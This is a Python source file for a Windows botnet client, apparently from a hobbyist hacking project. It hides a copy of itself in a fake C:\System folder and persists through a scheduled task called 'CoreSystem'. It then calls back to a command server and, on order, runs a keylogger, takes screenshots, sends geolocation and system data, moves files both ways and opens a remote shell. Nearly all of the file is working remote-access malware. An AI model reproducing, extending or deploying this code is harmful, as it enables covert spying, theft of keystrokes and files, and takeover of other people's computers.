# Date: 09/20/2017
# Author: Ethical-H4CK3R
# Description: Bot Computer

import os
import sys
import time
import json
import shutil
import socket
import random
import platform
import threading

from modules.schd import Task
from modules.file import File
from modules.sysinfo import system
from modules.keylogger import Keylogger
from modules.geo import Geolocate as Geo
from modules.screenshot import Screenshot
from modules.shell import Shell as Console
from modules.state import FileState as State

# XXX: After compiled, this code will try to replicate & hide to fake directory in root directory called System. EX: C:\System
# XXX: Then it will try to create a task in the task scheduler called CoreSystem.
# XXX: Then it will try to start scheduled task & kill initial process.

# only valid after compiled
if not State.isMoved(sys.executable):
 destpath = os.path.abspath(os.path.sep) + 'System'
 filename = os.path.basename(sys.executable)
 filepath = destpath + os.path.sep + filename
 
 if platform.system() == 'Windows':
  if not os.path.exists(destpath):os.makedirs(destpath)
  shutil.copyfile(os.path.abspath(sys.executable), filepath)
  Task(filepath, 'CoreSystem').run()
  
# to prevent multiple backdoors
if platform.system() == 'Windows':
 try:
  inpt, outpt, err = os.popen3('tasklist')
  if outpt.read().count(os.path.basename(sys.executable)) > 2:sys.exit()
 except:sys.exit()
else:sys.exit()

class Bot(Screenshot, Keylogger, Geo):
 def __init__(self):
  self.alive = True
  self.info = system
  self.home = os.getcwd()
  self.log = os.path.abspath(os.path.sep) + 'System' + os.path.sep + 'Syslog.txt'

  self.serverPort = {0}
  self.serverIp = '{1}'   
  
  Screenshot.__init__(self)
  Keylogger.__init__(self)
  Geo.__init__(self)
  self.connect()
  
 def callserver(self):
  try:
   self.bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   self.bot.connect((self.serverIp, self.serverPort))
   self.bot.settimeout(3) 
   return True
  except:pass

 def connect(self):
  search = True
  while search:
   for _ in range(15):
    if self.callserver():
     search = False
     break
    self.kill()
    time.sleep(random.randint(1, 5))
   time.sleep(random.randint(10, 15)) 

 def kill(self):
  try:
   self.bot.shutdown(socket.SHUT_RDWR)
   self.bot.close()
  except:pass

 def sendkeys(self):
  try:
   data = self.read()
   self.bot.sendall(str(len(data)))
   if self.bot.recv(1024) == '200':
    time.sleep(1.5)
    self.bot.sendall(data)
  except:pass
  
 def chrome(self, urls):
  cmd = 'start chrome.exe '
  for url in urls:
   cmd+=url+' '
  os.popen3(cmd)  

 def remove(self):
  Task.delete('CoreSystem')
  self.alive = False
  self.kill()
 
 def shutdown(self):
  os.popen3('shutdown /s /f')

 def run(self): 
  while self.alive:
   try:
    # wait for data
    data = self.bot.recv(1024)  

    # connection lost 
    if not data:
     self.connect()
     continue    
     
    pkt = json.loads(data)
    num = pkt['id']
    args = pkt['args']   
   
    # kill cmd from master 
    if num == 0:
     self.alive = False
     self.kill()
     continue

    # remove cmd from master
    if num == 1:
     self.remove()

    # keylogger start
    if num == 5:
     try:threading.Thread(target=self.keystrokes).start()
     except:pass

    # keylogger stop
    if num == 6:
     self.keylog = False if self.keylog else self.keylog

    # keylogger remove
    if num == 7:
     try:
      self.keylog = False 
      os.remove(self.log)
     except:pass 

    # keylogger show
    if num == 8:
     self.sendkeys()

    # shutdown
    if num == 96:
     self.shutdown()
 
    # chrome prank
    if num == 97:
     self.chrome(args)  
      
    # download from master
    if num == 98:
     File.download(self.bot, args[0], args[1])
     
    # upload to master
    if num == 99:
     File.upload(self.bot, args[0])
             
    # screenshot
    if num == 100:       
     data = self.capture()      
     File.upload(self.bot, data=data)
     os.remove(self.img)

    # shell
    if num == 101:
     Shell.run(self.bot, self.home)

    # send location to server
    if num == 102:
     self.getGeo()
     self.bot.sendall(json.dumps(self.location))      

    # send system info to server
    if num == 103:
     self.bot.sendall(json.dumps(self.info))

   except socket.timeout:pass
   except socket.error:self.connect()
   except:pass  
    
class Shell(Console):
 def __init__(self):
  Console.__init__(self)
   
 @classmethod
 def run(cls, session, home):  
  while 1:
   try:
    cmd = session.recv(1024) 
    if not len(cmd):break
    
    # sent from server
    if cmd == 'exit':break

    # execute & return
    output = cls().CMD(cmd)
    session.sendall(output.strip()) 
   except socket.timeout:pass 
   except socket.error:break  
   except:pass
  os.chdir(home)

if __name__ == '__main__':
 Bot().run()
